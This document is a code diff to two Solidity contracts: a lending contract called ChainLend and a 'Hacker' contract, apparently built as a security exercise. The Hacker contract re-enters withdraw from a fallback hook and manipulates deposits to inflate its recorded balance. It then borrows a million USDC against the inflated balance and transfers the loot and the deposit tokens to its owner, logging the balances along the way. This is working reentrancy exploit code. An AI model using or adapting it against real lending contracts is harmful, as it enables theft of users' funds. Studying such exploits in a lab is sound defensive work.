@@ -67,8 +67,9 @@ contract ChainLend {
     borrowToken.transfer(msg.sender, amount);
     console.log(
       "You borrow succefully %s USDC",
-      borrowToken.balanceOf(msg.sender)
+      borrowToken.balanceOf(msg.sender) / 1e6
     );
+    console.log("You Have  %s BTC", depositToken.balanceOf(msg.sender));
     console.log(
       "Chainled thinks that you have %s btc after borrow function ends",
       deposits[msg.sender]
@@ -117,7 +118,7 @@ contract Hacker {
     counter++;
     console.log("Go thought the Fallback for the %s Time", counter);
     if (counter % 2 == 0) {
-      chainLend.withdraw(99999999);
+      chainLend.withdraw(99_999_999);
       console.log(
         "Hacker imBTC balance is: %s",
         chainLend.depositToken().balanceOf(address(this))
@@ -128,14 +129,31 @@ contract Hacker {
   }
 
   function attackDeposit() public {
-    chainLend.deposit(99999999);
+    chainLend.deposit(99_999_999);
     chainLend.deposit(1);
     chainLend.withdraw(1);
   }
 
   function borrow() public {
-    chainLend.borrow(1000000 * 1e6);
-    // chainLend.borrowToken().transfer(owner, )
-    chainLend.withdraw(100000000);
+    // chainLend.withdraw(1e8);
+    chainLend.borrow(1_000_000 * 1e6);
+    chainLend.borrowToken().transfer(owner, 1_000_000 * 1e6);
+    chainLend.depositToken().transfer(owner, 100000000);
+    console.log(
+      "Hacker USDC balance is ",
+      chainLend.borrowToken().balanceOf(address(this))
+    );
+    console.log(
+      "Hacker imBTC balance is ",
+      chainLend.depositToken().balanceOf(address(this))
+    );
+    console.log(
+      "Owner USDC balance is ",
+      chainLend.borrowToken().balanceOf(owner) / 1e6
+    );
+    console.log(
+      "Owner imBTC balance is ",
+      chainLend.depositToken().balanceOf(owner) / 1e8
+    );
   }
 }
